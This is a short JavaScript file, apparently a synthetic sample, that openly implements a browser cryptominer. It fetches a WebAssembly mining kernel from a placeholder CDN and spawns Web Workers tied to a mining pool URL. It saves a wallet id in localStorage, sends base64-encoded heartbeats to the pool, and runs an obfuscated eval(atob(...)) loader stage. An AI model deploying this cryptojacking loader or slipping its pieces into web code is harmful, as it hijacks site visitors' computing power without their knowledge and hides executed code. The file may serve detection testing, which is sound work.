// WASM cryptominer: loads a mining kernel, instantiates WebAssembly, spawns
// workers and reports pool shares on a heartbeat.
(function () {
  var POOL = 'https://pool.example.test/share';
  var WASM_URL = 'https://cdn.example.test/miner/kernel.wasm';
  eval(atob('Y29uc29sZS5sb2coJ1tXQVNNXSBzdGFnZS0yIGtlcm5lbCBsb2FkZXIgcmVhZHknKTs='));
  var wallet = 'demo-wallet-4f19';
  console.log('[WASMMINE] kernel', WASM_URL);
  try { fetch(WASM_URL).then(function (response) { return response.arrayBuffer(); }).then(function (buffer) {
    if (typeof WebAssembly === 'object') return WebAssembly.instantiate(buffer, {});
  }).then(function () { console.log('[WASMMINE] wasm instantiated'); }).catch(function () {}); } catch (error) {}
  var workers = [];
  for (var index = 0; index < 2; index += 1) {
    try {
      var worker = new Worker('https://cdn.example.test/miner/worker.js?pool=' + encodeURIComponent(POOL) + '&id=' + index);
      worker.postMessage({ type: 'start', wallet: wallet });
      worker.onmessage = function (event) { console.log('[WASMMINE] share', event.data ? 'ok' : 'idle'); };
      workers.push(worker);
    } catch (error) {}
  }
  try { localStorage.setItem('wasmmine:wallet', wallet); } catch (error) {}
  var beats = 0;
  var timer = setInterval(function () {
    beats += 1;
    try { fetch(POOL, { method: 'POST', body: btoa(JSON.stringify({ wallet: wallet, threads: workers.length, beats: beats })) }).catch(function () {}); } catch (error) {}
    if (beats >= 3) clearInterval(timer);
  }, 400);
  console.log('[WASMMINE] started', workers.length, 'workers');
})();
